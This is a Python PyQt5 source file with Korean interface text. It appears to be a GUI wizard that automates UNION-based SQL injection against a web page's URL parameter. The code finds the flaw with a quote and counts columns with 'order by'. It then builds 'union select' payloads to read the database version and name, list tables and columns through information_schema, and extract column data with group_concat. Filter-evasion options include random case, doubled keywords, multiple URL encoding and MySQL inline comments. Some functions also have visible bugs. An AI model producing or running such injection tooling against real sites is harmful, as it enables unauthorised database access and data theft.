#-*- coding: utf-8 -*-

import sys
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from modules import *
import layout

#-------------------------------------------------------------------------------------------------------------------------

save = ""

def Step0_Next(self):
	if layout.url[0].text().rfind("=") == -1 or layout.url[0].text().rfind("?") == -1:
		Error("Error", "취약점이 있는 페이지를 찾아주세요.")
	else:
		layout.wrap[0].hide()
		layout.wrap[1].show()
		text = layout.url[0].text()
		sliced = text[-10 : layout.url[0].text().rfind("=") + 1]
		numberSetText = layout.step1_number.setItemText

		numberSetText(0, sliced + text[layout.url[0].text().rfind("=") + 1 : len(layout.url[0].text())])
		numberSetText(1, sliced + "99999")
		numberSetText(2, sliced + "null")

		layout.url[1].setText(layout.url[0].text() + "'")

		global save
		save += "-타격할 페이지\n" + layout.url[0].text() + "\n\n"

#------------------------------------------------------------------------------------------------------------------------

def Step1_SetNumber():
	defaultUrl = layout.url[0].text()[0 : -10]
	setUrl = layout.url[1].setText
	current = layout.step1_number.currentText()
	colon = layout.setColon.currentText()

	if layout.step1_number.currentIndex() == 0:
		setUrl(defaultUrl + current + colon)
	elif layout.step1_number.currentIndex() == 1:
		setUrl(defaultUrl + current + colon)
	elif layout.step1_number.currentIndex() == 2:
		setUrl(defaultUrl + current + colon)

def Step1_SetColon():
	defaultUrl = layout.url[0].text()[0 : -10]
	setUrl = layout.url[1].setText
	current = layout.step1_number.currentText()
	colon = layout.setColon.currentText()

	if layout.setColon.currentIndex() == 0:
		setUrl(defaultUrl + current + colon)
	elif layout.setColon.currentIndex() == 1:
		setUrl(defaultUrl + current + colon)
	elif layout.setColon.currentIndex() == 2:
		setUrl(defaultUrl + current + colon)

def Step1_SettingColon():
	if layout.setAscii[1].currentIndex() == 0:
		layout.setColon.setItemText(0, "'")
		layout.setColon.setItemText(1, '"')
		layout.setColon.setItemText(2, ")")
		Step1_SetColon()
	elif layout.setAscii[1].currentIndex() == 1:
		layout.setColon.setItemText(0, DoubleAscii("'"))
		layout.setColon.setItemText(1, DoubleAscii('"'))
		layout.setColon.setItemText(2, DoubleAscii(")"))
		Step1_SetColon()
	elif layout.setAscii[1].currentIndex() == 2:
		layout.setColon.setItemText(0, TripleAscii("'"))
		layout.setColon.setItemText(1, TripleAscii('"'))
		layout.setColon.setItemText(2, TripleAscii(")"))
		Step1_SetColon()

def Step1_Prev():
	layout.wrap[1].hide()
	layout.wrap[0].show()

def Step1_Next():
	layout.wrap[1].hide()
	layout.confirm_step1_wrap.show()

	global save
	save += "-취약점 발견\n" + layout.url[1].text() + "\n\n"

def Step1_Confirm_Prev():
	layout.confirm_step1_wrap.hide()
	layout.wrap[1].show()

def Step1_Confirm_Next():
	for i in range(0, len(layout.confirm_step1_radioButton)):
		if layout.confirm_step1_radioButton[i].isChecked() == True:
			layout.confirm_step1_wrap.hide()
			layout.wrap[2].show()
			layout.url[2].setText(layout.url[1].text() + layout.order_by.currentText() + layout.lastComment.currentText())

			global save
			save += "-DB : " + layout.confirm_step1_radioButton[i].text() + "\n\n"

			break

		elif i == len(layout.confirm_step1_radioButton) - 1 and layout.confirm_step1_radioButton[i].isChecked() == False:
			Error("에러", "선택된 것이 없습니다.")

#------------------------------------------------------------------------------------------------------------------------------

def Step2_SetOrderBy():
	defaultUrl = layout.url[1].text()
	setUrl = layout.url[2].setText
	current = layout.order_by.currentText()
	comment = layout.lastComment.currentText()
	amount = layout.column_amount.text()

	if layout.column_amount.text() != "" and layout.column_amount.text().isdigit() == False:
		Error("에러", "숫자만 입력해주세요")
		layout.column_amount.setText("")
	else :
		setUrl(defaultUrl + current + amount + comment)

def Step2_SettingOrderBy():
	settext = layout.order_by.setItemText
	text0 = layout.order_by.itemText(0)
	text1 = layout.order_by.itemText(1)
	orderby = " order by "
	groupby = " group by "

	if layout.alphabetCase[2].currentIndex() == 0:
		orderby = orderby
		groupby = groupby
	elif layout.alphabetCase[2].currentIndex() == 1:
		orderby = orderby.upper()
		groupby = groupby.upper()

	elif layout.alphabetCase[2].currentIndex() == 2:
		orderby = RandomCase(orderby)
		groupby = RandomCase(groupby)

	elif layout.alphabetCase[2].currentIndex() == 3:
		orderby = " ORorderDER BbyY "
		groupby = " GRgroupOUP BbyY "


	if layout.setAscii[2].currentIndex() == 0:
		orderby = orderby
		groupby = groupby
	elif layout.setAscii[2].currentIndex() == 1:
		orderby = " " + DoubleAscii(orderby[1]) + orderby[2 : orderby.find(" ", 1) + 1] + DoubleAscii(orderby[orderby.find(" ", 1) + 1]) + orderby[orderby.find(" ", 1) + 2 : len(orderby)]
		groupby = " " + DoubleAscii(groupby[1]) + groupby[2 : groupby.find(" ", 1) + 1] + DoubleAscii(groupby[groupby.find(" ", 1) + 1]) + groupby[groupby.find(" ", 1) + 2 : len(groupby)]

	elif layout.setAscii[2].currentIndex() == 2:
		orderby = " " + TripleAscii(orderby[1]) + orderby[2 : orderby.find(" ", 1) + 1] + TripleAscii(orderby[orderby.find(" ", 1) + 1]) + orderby[orderby.find(" ", 1) + 2 : len(orderby)]
		groupby = " " + TripleAscii(groupby[1]) + groupby[2 : groupby.find(" ", 1) + 1] + TripleAscii(groupby[groupby.find(" ", 1) + 1]) + groupby[groupby.find(" ", 1) + 2 : len(groupby)]

	elif layout.setAscii[2].currentIndex() == 3:
		orderby = DoubleAscii(orderby).replace("%2520", " ")
		groupby = DoubleAscii(groupby).replace("%2520", " ")

	elif layout.setAscii[2].currentIndex() == 4:
		orderby = TripleAscii(orderby).replace("%2520", " ")
		groupby = TripleAscii(groupby).replace("%2520", " ")


	if layout.whiteSpace[2].currentIndex() == 0:
		orderby = orderby
		groupby = groupby
	elif layout.whiteSpace[2].currentIndex() == 1:
		orderby = orderby.replace(" ", WhiteSpace())
		groupby = groupby.replace(" ", WhiteSpace())

	elif layout.whiteSpace[2].currentIndex() == 2:
		orderby = orderby.replace(" ", WhiteSpaceDouble())
		groupby = groupby.replace(" ", WhiteSpaceDouble())


	if layout.comment[2].currentIndex() == 0:
		orderby = orderby
		groupby = groupby
	elif layout.comment[2].currentIndex() == 1:
		orderby = " /*!" + orderby[1 : orderby.find(" ", 1)] + "*/ /*!" + orderby[orderby.find(" ", 1) + 1 : len(orderby) - 1] + "*/ "
		groupby = " /*!" + groupby[1 : groupby.find(" ", 1)] + "*/ /*!" + groupby[groupby.find(" ", 1) + 1 : len(groupby) - 1] + "*/ "

	settext(0, orderby)
	settext(1, groupby)
	Step2_SetOrderBy()

def Step2_Prev():
	layout.wrap[2].hide()
	layout.wrap[1].show()

def Step2_Next():
	if layout.column_amount.text() != "":
		layout.wrap[2].hide()
		layout.wrap[3].show()

		global save
		save += "-컬럼 갯수 파악\n" + layout.url[2].text() + "\n\n" + "컬럼 갯수 : " + layout.column_amount.text() + "\n\n"

		url = layout.url[1].text()
		union = " union select "
		comment = layout.lastComment.currentText()
		amount = int(layout.column_amount.text())
		number = []
		scratch = []
		null = []
		for i in range(0, amount):
			number.append(i + 1)
			scratch.append(str(i + 1) * 4)
			null.append("null")

		amount = str(number)
		amount = amount[1 : -1].replace(" ", "")

		scratch = str(scratch)
		scratch = scratch[1 : -1].replace(" ", "").replace("'", "")

		null = str(null)
		null = null[1 : -1].replace(" ", "").replace("'", "")

		layout.url[3].setText(url + union + amount + comment)

		layout.number.setItemText(0, amount)
		layout.number.setItemText(1, null)
		layout.number.setItemText(2, scratch)

	else:
		Error("에러", "숫자가 입력되지 않았습니다.")

#-------------------------------------------------------------------------------------

def Step3_SetUrl():
	errorFactor = ""
	if layout.error_factor.currentIndex() == 0:
		errorFactor = ""
	elif layout.error_factor.currentIndex() == 1:
		errorFactor = "-"

	url = layout.url[1].text()[0 : layout.url[1].text().rfind("=") + 1]
	url_ = layout.url[1].text()[layout.url[1].text().rfind("=") + 1 : len(layout.url[1].text())]
	union = layout.union_select.currentText()
	number = layout.number.currentText()
	comment = layout.lastComment.currentText()

	layout.url[3].setText(url + errorFactor + url_ + union + number + comment)


def Step3_SetUnion():
	union = " union select "
	union_ = " union all select "
	settext = layout.union_select.setItemText
	if layout.alphabetCase[3].currentIndex() == 0:
		union = union
		union_ = union_
	elif layout.alphabetCase[3].currentIndex() == 1:
		union = union.upper()
		union_ = union_.upper()

	elif layout.alphabetCase[3].currentIndex() == 2:
		union = RandomCase(union)
		union_ = RandomCase(union_)

	elif layout.alphabetCase[3].currentIndex() == 3:
		union = " UNunionION SELselectECT "
		union_ = " UNunionION AallLL SELselectECT "


	if layout.setAscii[3].currentIndex() == 0:
		union = union
		union_ = union_
	elif layout.setAscii[3].currentIndex() == 1:
		ascii_u = DoubleAscii(union[1])
		nion = union[2 : union.find(" ", 1) + 1]
		ascii_s = DoubleAscii(union[union.find(" ", 1) + 1])
		elect = union[union.find(" ", 1) + 2 : len(union)]

		ascii_u_ = DoubleAscii(union_[1])
		nion_ = union_[2 : union_.find(" ", 1) + 1]
		ascii_a_ = DoubleAscii(union_[union_.find(" ", 1) + 1])
		ll_ = union_[union_.find(" ", 1) + 2 : union_.find(" ", union_.find(" ", 1) + 1) + 1]
		ascii_s_ = DoubleAscii(union_[union_.find(" ", union_.find(" ", 1) + 1) + 1])
		elect_ = union_[union_.find(" ", union_.find(" ", 1) + 1) + 2 : len(union_)]

		union = " " + ascii_u + nion + ascii_s + elect
		union_ = " " + ascii_u_ + nion_ + ascii_a_ + ll_ + ascii_s_ + elect_

	elif layout.setAscii[3].currentIndex() == 2:
		ascii_u = TripleAscii(union[1])
		nion = union[2 : union.find(" ", 1) + 1]
		ascii_s = TripleAscii(union[union.find(" ", 1) + 1])
		elect = union[union.find(" ", 1) + 2 : len(union)]

		ascii_u_ = TripleAscii(union_[1])
		nion_ = union_[2 : union_.find(" ", 1) + 1]
		ascii_a_ = TripleAscii(union_[union_.find(" ", 1) + 1])
		ll_ = union_[union_.find(" ", 1) + 2 : union_.find(" ", union_.find(" ", 1) + 1) + 1]
		ascii_s_ = TripleAscii(union_[union_.find(" ", union_.find(" ", 1) + 1) + 1])
		elect_ = union_[union_.find(" ", union_.find(" ", 1) + 1) + 1 : len(union_)]

		union = " " + ascii_u + nion + ascii_s + elect
		union_ = " " + ascii_u_ + nion_ + ascii_a_ + ll_ + ascii_s_ + elect_

	elif layout.setAscii[3].currentIndex() == 3:
		union = DoubleAscii(union).replace("%2520", " ")
		union_ = DoubleAscii(union_).replace("%2520", " ")

	elif layout.setAscii[3].currentIndex() == 4:
		union = TripleAscii(union).replace("%252520", " ")
		union_ = TripleAscii(union_).replace("%252520", " ")


	if layout.whiteSpace[3].currentIndex() == 0:
		union = union
		union_ = union_
	elif layout.whiteSpace[3].currentIndex() == 1:
		union = union.replace(" ", WhiteSpace())
		union_ = union_.replace(" ", WhiteSpace())

	elif layout.whiteSpace[3].currentIndex() == 2:
		union = union.replace(" ", WhiteSpaceDouble())
		union_ = union_.replace(" ", WhiteSpaceDouble())


	if layout.comment[3].currentIndex() == 0:
		union = union
		union_ = union_
	elif layout.comment[3].currentIndex() == 1:
		sliced_union = union[1 : union.find(" ", 1)]
		sliced_select = union[union.find(" ", 1) + 1 : union.find(" ", union.find(" ", 1) + 1)]
		union = " /*!" + sliced_union + "*/ /*!" + sliced_select + "*/ "

		sliced_union_ = union_[1: union_.find(" ", 1)]
		sliced_all_ = union_[union_.find(" ", 1) + 1 : union_.find(" ", union_.find(" ", 1) + 1)]
		sliced_select_ = union_[union_.find(" ", union_.find(" ", 1) + 1) + 1 : union_.find(" ", union_.find(" ", union_.find(" ", 1) + 1) + 1)]
		union_ = " /*!" + sliced_union_ + "*/ /*!" + sliced_all_ + "*/ /*!" + sliced_select_ + "*/ "

	settext(0, union)
	settext(1, union_)
	Step3_SetUrl()


def Step3_Prev():
	layout.wrap[3].hide()
	layout.wrap[2].show()

def Step3_Next():
	layout.wrap[3].hide()
	layout.confirm_step3_wrap.show()

	global save
	save += "-취약한 컬럼 파악하기\n" + layout.url[3].text() + "\n\n"

#-----------------------------------------------------------------------------------------------------------------------------


def Step3_Confirm_Input():
	if layout.confirm_step3_input.text() != "" and layout.confirm_step3_input.text().isdigit() == False:
		Error("에러", "숫자만 입력해주세요")
		layout.confirm_step3_input.setText("")

def Step3_Confirm_Prev():
	layout.wrap[3].show()
	layout.confirm_step3_wrap.hide()

def OverStep3(entity, what):
	url = layout.url[1].text()[0 : layout.url[1].text().rfind("=") + 1]
	url_ = layout.url[1].text()[layout.url[1].text().rfind("=") + 1 : len(layout.url[1].text())]
	union = layout.union_select.currentText()
	comment = layout.lastComment.currentText()
	errorFactor = ""
	if layout.error_factor.currentIndex() == 1:
		errorFactor = "-"

	num = int(layout.confirm_step3_input.text())
	amount = int(layout.column_amount.text())
	number = []

	for i in range(0, amount):
		if layout.number.currentIndex() == 0:
			if i == num - 1:
				number.append(what)
			else:
				number.append(i + 1)
		elif layout.number.currentIndex() == 1:
			if i == num - 1:
				number.append(what)
			else:
				number.append("null")
		elif layout.number.currentIndex() == 1:
			if i == num - 1:
				number.append(what)
			else:
				number.append(str(i) * 4)

	number = str(number)
	number = number[1 : -1].replace(" ", "").replace("'", "")

	entity.setText(url + errorFactor + url_ + union + number + comment)


def Step3_Confirm_Next():
	if layout.confirm_step3_input.text() == "":
		Error("에러", "숫자가 입력되지 않았습니다.")
	else:
		layout.wrap[4].show()
		layout.confirm_step3_wrap.hide()

		OverStep3(layout.url[4], "version()")

		global save
		save += "취약한 컬럼 : " + layout.confirm_step3_input.text() + "\n\n"


#------------------------------------------------------------------------------------------------------------------------------



def Step4_SetUrl():
	version = "version()"
	version_ = "@@version()"
	database = "database()"

	settext = layout.version.setItemText

	if layout.alphabetCase[4].currentIndex() == 0:
		version = version.lower()
		version_ = version_.lower()
		database = database.lower()
	elif layout.alphabetCase[4].currentIndex() == 1:
		version = version.upper()
		version_ = version_.upper()
		database = database.upper()
	elif layout.alphabetCase[4].currentIndex() == 2:
		version = RandomCase(version)
		version_ = RandomCase(version_)
		database = RandomCase(database)

	if layout.setAscii[4].currentIndex() == 0:
		version = version
		version_ = version_
		database = database
	elif layout.setAscii[4].currentIndex() == 1:
		version = DoubleAscii(version[0]) + version[1 : len(version)]
		version_ = DoubleAscii(version_[0]) + version_[1 : len(version_)]
		database = DoubleAscii(database[0]) + database[1 : len(database)]
	elif layout.setAscii[4].currentIndex() == 2:
		version = TripleAscii(version[0]) + version[1 : len(version)]
		version_ = TripleAscii(version_[0]) + version_[1 : len(version_)]
		database = TripleAscii(database[0]) + database[1 : len(database)]
	elif layout.setAscii[4].currentIndex() == 3:
		version = DoubleAscii(version)
		version_ = DoubleAscii(version_)
		database = DoubleAscii(database)
	elif layout.setAscii[4].currentIndex() == 4:
		version = TripleAscii(version)
		version_ = TripleAscii(version_)
		database = TripleAscii(database)

	if layout.comment[4].currentIndex() == 0:
		version = version
		version_ = version_
		database = database
	elif layout.comment[4].currentIndex() == 1:
		version = "/*!" + version + "*/"
		version_ = "/*!" + version_ + "*/"
		database = "/*!" + database + "*/"
	settext(0, version)
	settext(1, version_)
	OverStep3(layout.url[4], layout.version.currentText())
	OverStep3(layout.url[5], database)


def Step4_Prev():
	layout.wrap[4].hide()
	layout.wrap[3].show()

def Step4_Next():
	layout.wrap[4].hide()
	layout.confirm_step4_wrap.show()
	if layout.url[5].text() == "":
		OverStep3(layout.url[5], "database()")

	global save
	save += "-서버 운영체제 파악\n" + layout.url[4].text() + "\n\n"

def Step4_Confirm_Prev():
	layout.wrap[4].show()
	layout.confirm_step4_wrap.hide()

def Step4_Confirm_Next():
	layout.confirm_step4_wrap.hide()
	layout.wrap[5].show()

	global save
	save += "-서버 운영체제 : " + layout.confirm_step4_input.text() + "\n\n"


#----------------------------------------------------------------

def OverStep6(entity, groupConcat, schema):
	url = layout.url[1].text()[0 : layout.url[1].text().rfind("=") + 1]
	url_ = layout.url[1].text()[layout.url[1].text().rfind("=") + 1 : len(layout.url[1].text())]
	union = layout.union_select.currentText()
	comment = layout.lastComment.currentText()
	errorFactor = ""
	if layout.error_factor.currentIndex() == 1:
		errorFactor = "-"

	num = int(layout.confirm_step3_input.text())
	amount = int(layout.column_amount.text())
	number = []

	for i in range(0, amount):
		if layout.number.currentIndex() == 0:
			if i == num - 1:
				number.append(groupConcat)
			else:
				number.append(i + 1)
		elif layout.number.currentIndex() == 1:
			if i == num - 1:
				number.append(groupConcat)
			else:
				number.append("null")
		elif layout.number.currentIndex() == 1:
			if i == num - 1:
				number.append(groupConcat)
			else:
				number.append(str(i) * 4)

	number = str(number)
	number = number[1 : -1].replace(" ", "").replace("'", "")

	entity.setText(url + errorFactor + url_ + union + number + schema + comment)


def Step5_Prev():
	layout.wrap[5].hide()
	layout.wrap[4].show()

def Step5_Next():
	layout.wrap[5].hide()
	layout.confirm_step5_wrap.show()

	global save
	save += "-DB이름 파악하기\n" + layout.url[5].text() + "\n\n"

def Step5_Confirm_Prev():
	layout.wrap[5].show()
	layout.confirm_step5_wrap.hide()

def Step5_Confirm_Next():
	layout.confirm_step5_wrap.hide()
	layout.wrap[6].show()
	OverStep6(layout.url[6], "group_concat(0x0d, table_name)", " from information_schema.tables where table_schema=database()")

	global save
	save += "DB 이름 : " + layout.confirm_step5_input.text() + "\n\n"

#-----------------------------------------------------------------


def Step6_SetUrl():
	#step6
	table_name = "group_concat(0x0d, table_name)"
	from_ = "from"
	tables = "information_schema.tables"
	where = "where"
	table_schema = "table_schema=database()"
	space = " "
	info = space + from_ + space + tables + space + table_schema


	if layout.alphabetCase[6].currentIndex() == 0:
		table_name = table_name.lower()
	elif layout.alphabetCase[6].currentIndex() == 1:
		table_name = table_name.upper()
	elif layout.alphabetCase[6].currentIndex() == 1:
		table_name = RandomCase(table_name)

	if layout.setAscii[6].currentIndex() == 0:
		table_name = table_name
	elif layout.setAscii[6].currentIndex() == 1:
		table_name = DoubleAscii(table_name[0]) + table_name[1 : len(table_name)]
	elif layout.setAscii[6].currentIndex() == 2:
		table_name = TripleAscii(table_name[0]) + table_name[1 : len(table_name)]
	elif layout.setAscii[6].currentIndex() == 3:
		table_name = DoubleAscii(table_name[0 : 11]) + table_name[12 : len(table_name)]
	elif layout.setAscii[6].currentIndex() == 4:
		table_name = TripleAscii(table_name[0 : 11]) + table_name[12 : len(table_name)]

	if layout.comment[6].currentIndex() == 0:
		table_name = table_name
	elif layout.comment[6].currentIndex() == 1:
		table_name = "/*!" + table_name + "*/"

	if layout.alphabetCase[7].currentIndex() == 0:
		info = info.lower()
	elif layout.alphabetCase[7].currentIndex() == 1:
		info = info.upper()
	elif layout.alphabetCase[7].currentIndex() == 1:
		info = RandomCase(info)

	if layout.setAscii[7].currentIndex() == 0:
		info = info
	elif layout.setAscii[7].currentIndex() == 1:
		from_[0] = DoubleAscii(from_[0])
		tables[0] = DoubleAscii(tables[0])
		table_schema[0] = DoubleAscii(table_schema[0])
	elif layout.setAscii[7].currentIndex() == 2:
		from_[0] = TripleAscii(from_[0])
		tables[0] = TripleAscii(tables[0])
		table_schema[0] = TripleAscii(table_schema[0])
	elif layout.setAscii[7].currentIndex() == 3:
		from_ = DoubleAscii(from_)
		tables = DoubleAscii(tables)
		table_schema = DoubleAscii(table_schema)
	elif layout.setAscii[7].currentIndex() == 4:
		from_ = TripleAscii(from_)
		tables = TripleAscii(tables)
		table_schema = TripleAscii(table_schema)

	if layout.comment[7].currentIndex() == 0:
		info = info
	elif layout.comment[7].currentIndex() == 1:
		from_ = "/*!" + from_ + "*/"
		tables = "/*!" + tables + "*/"
		table_schema = "/*!" + table_schema + "*/"

	if layout.whiteSpace[7].currentIndex() == 0:
		space = space
	elif layout.whiteSpace[7].currentIndex() == 1:
		space = WhiteSpace(space)
	elif layout.whiteSpace[7].currentIndex() == 2:
		space = WhiteSpaceDouble(space)

	OverStep6(layout.url[6], table_name, info)

def Step6_Prev():
	layout.wrap[6].hide()
	layout.wrap[6].show()

def Step6_Next():
	layout.wrap[6].hide()
	layout.confirm_step6_wrap.show()

	global save
	save += "-Table 이름 알아내기\n" + layout.url[6].text() + "\n\n"


def Step6_Confirm_Prev():
	layout.wrap[6].show()
	layout.confirm_step6_wrap.hide()

def Step6_Confirm_Next():
	layout.wrap[7].show()
	layout.confirm_step6_wrap.hide()

	from_ = "from"
	space = " "
	where = "where"
	#step7
	column_name = "group_concat(0x0d, column_name)"
	column_info_1 = "information_schema.columns"
	column_info_2 = "table_name='" + layout.confirm_step6_input.text() + "'"
	column_info = space + from_ + space + column_info_1 + space + where + space + column_info_2


	if layout.alphabetCase[6].currentIndex() == 0:
		column_name = column_name.lower()
	elif layout.alphabetCase[6].currentIndex() == 1:
		column_name = column_name.upper()
	elif layout.alphabetCase[6].currentIndex() == 1:
		column_name = RandomCase(column_name)

	if layout.setAscii[6].currentIndex() == 0:
		column_name = column_name
	elif layout.setAscii[6].currentIndex() == 1:
		column_name = DoubleAscii(column_name[0]) + column_name[1 : len(column_name)]
	elif layout.setAscii[6].currentIndex() == 2:
		column_name = TripleAscii(column_name[0]) + column_name[1 : len(column_name)]
	elif layout.setAscii[6].currentIndex() == 3:
		column_name = DoubleAscii(column_name[0 : 11]) + column_name[12 : len(column_name)]
	elif layout.setAscii[6].currentIndex() == 4:
		column_name = TripleAscii(column_name[0 : 11]) + column_name[12 : len(column_name)]

	if layout.comment[6].currentIndex() == 0:
		column_name = column_name
	elif layout.comment[6].currentIndex() == 1:
		column_name = "/*!" + column_name + "*/"

	if layout.alphabetCase[7].currentIndex() == 0:
		column_info = column_info.lower()
	elif layout.alphabetCase[7].currentIndex() == 1:
		column_info = column_info.upper()
	elif layout.alphabetCase[7].currentIndex() == 1:
		column_info = RandomCase(column_info)

	if layout.setAscii[7].currentIndex() == 0:
		column_info = column_info
	elif layout.setAscii[7].currentIndex() == 1:
		from_[0] = DoubleAscii(from_[0])
		where[0] = DoubleAscii(where[0])
		column_info_1[0] = DoubleAscii(column_info_1[0])
		column_info_2[0] = DoubleAscii(column_info_2[0])
	elif layout.setAscii[7].currentIndex() == 2:
		from_[0] = TripleAscii(from_[0])
		where[0] = TripleAscii(where[0])
		column_info_1[0] = TripleAscii(column_info_1[0])
		column_info_2[0] = TripleAscii(column_info_2[0])
	elif layout.setAscii[7].currentIndex() == 3:
		from_ = DoubleAscii(from_)
		where = DoubleAscii(where)
		column_info_1 = DoubleAscii(column_info_1)
		column_info_2 = DoubleAscii(column_info_2)
	elif layout.setAscii[7].currentIndex() == 4:
		from_ = TripleAscii(from_)
		where = TripleAscii(where)
		column_info_1 = TripleAscii(column_info_1)
		column_info_2 = TripleAscii(column_info_2)

	if layout.comment[7].currentIndex() == 0:
		column_info = column_info
	elif layout.comment[7].currentIndex() == 1:
		from_ = "/*!" + from_ + "*/"
		where = "/*!" + where + "*/"
		column_info_1 = "/*!" + column_info_1 + "*/"
		column_info_2 = "/*!" + column_info_2 + "*/"

	if layout.whiteSpace[7].currentIndex() == 0:
		space = space
	elif layout.whiteSpace[7].currentIndex() == 1:
		space = WhiteSpace(space)
	elif layout.whiteSpace[7].currentIndex() == 2:
		space = WhiteSpaceDouble(space)

	OverStep6(layout.url[7], column_name, column_info)

	global save
	save += "Table 리스트 : \n" + layout.confirm_step6_textarea.toPlainText() + "\n\n"



#-------------------------------------------------------------

def Step7_Prev():
	layout.wrap[7].hide()
	layout.wrap[6].show()

def Step7_Next():
	layout.wrap[7].hide()
	layout.confirm_step7_wrap.show()

	global save
	save += "-Column 이름 알아내기\n" + layout.url[7].text() + "\n\n"

def Step7_Confirm_Prev():
	layout.wrap[7].show()
	layout.confirm_step7_wrap.hide()

def Step7_Confirm_Next():
	layout.wrap[8].show()
	layout.confirm_step7_wrap.hide()

	from_ = "from"
	space = " "
	where = "where"
	data = "0x0d," + layout.confirm_step7_input.text().replace(",", ",0x0d,") + ",0x0d,0x0d"
	table = layout.confirm_step6_input.text()

	data_name = "group_concat(" + data + ")"
	table_name = space + from_ + space + table


	if layout.alphabetCase[6].currentIndex() == 0:
		data_name = data_name.lower()
	elif layout.alphabetCase[6].currentIndex() == 1:
		data_name = data_name.upper()
	elif layout.alphabetCase[6].currentIndex() == 1:
		data_name = RandomCase(data_name)

	if layout.setAscii[6].currentIndex() == 0:
		data_name = data_name
	elif layout.setAscii[6].currentIndex() == 1:
		data_name = DoubleAscii(data_name[0]) + data_name[1 : len(data_name)]
	elif layout.setAscii[6].currentIndex() == 2:
		data_name = TripleAscii(data_name[0]) + data_name[1 : len(data_name)]
	elif layout.setAscii[6].currentIndex() == 3:
		data_name = DoubleAscii(data_name[0 : 11]) + data_name[12 : len(data_name)]
	elif layout.setAscii[6].currentIndex() == 4:
		data_name = TripleAscii(data_name[0 : 11]) + data_name[12 : len(data_name)]

	if layout.comment[6].currentIndex() == 0:
		data_name = data_name
	elif layout.comment[6].currentIndex() == 1:
		data_name = "/*!" + data_name + "*/"

	if layout.alphabetCase[7].currentIndex() == 0:
		table_name = table_name.lower()
	elif layout.alphabetCase[7].currentIndex() == 1:
		table_name = table_name.upper()
	elif layout.alphabetCase[7].currentIndex() == 1:
		table_name = RandomCase(table_name)

	if layout.setAscii[7].currentIndex() == 0:
		table_name = table_name
	elif layout.setAscii[7].currentIndex() == 1:
		from_[0] = DoubleAscii(from_[0])
		table[0] = DoubleAscii(table[0])
	elif layout.setAscii[7].currentIndex() == 2:
		from_[0] = TripleAscii(from_[0])
		table[0] = TripleAscii(table[0])
	elif layout.setAscii[7].currentIndex() == 3:
		from_ = DoubleAscii(from_)
		table = DoubleAscii(table)
	elif layout.setAscii[7].currentIndex() == 4:
		from_ = TripleAscii(from_)
		table = TripleAscii(table)

	if layout.comment[7].currentIndex() == 0:
		table_name = table_name
	elif layout.comment[7].currentIndex() == 1:
		from_ = "/*!" + from_ + "*/"
		table = "/*!" + table + "*/"

	if layout.whiteSpace[7].currentIndex() == 0:
		space = space
	elif layout.whiteSpace[7].currentIndex() == 1:
		space = WhiteSpace(space)
	elif layout.whiteSpace[7].currentIndex() == 2:
		space = WhiteSpaceDouble(space)

	OverStep6(layout.url[8], data_name, table_name)

	global save
	save += layout.confirm_step6_input.text() + "의 Column 리스트\n" + layout.confirm_step7_textarea.toPlainText() + "\n\n"

#----------------------------------------------------------------------

def Step8_Prev():
	layout.wrap[8].hide()
	layout.wrap[7].show()

def Step8_Next():
	layout.wrap[8].hide()
	layout.confirm_step8_wrap.show()

	global save
	save += "-Column에서 데이터 추출하기\n" + layout.url[8].text() + "\n\n"

def Step8_Confirm_Prev():
	layout.wrap[8].show()
	layout.confirm_step8_wrap.hide()

def Step8_Confirm_Save(self):
	global save
	save += layout.confirm_step7_input.text() + " 의 데이터 : \n" + layout.confirm_step8_textarea.toPlainText()

	#fileName = QFileDialog.getSaveFileName(self, "Save File", "./", "Text files (*.txt)")
	#fileName = str(fileName)[2 : str(fileName).find(",") -1] + ".txt"
	#saveFile = open(fileName, 'w')
	#saveFile.write(save)
	#saveFile.close()
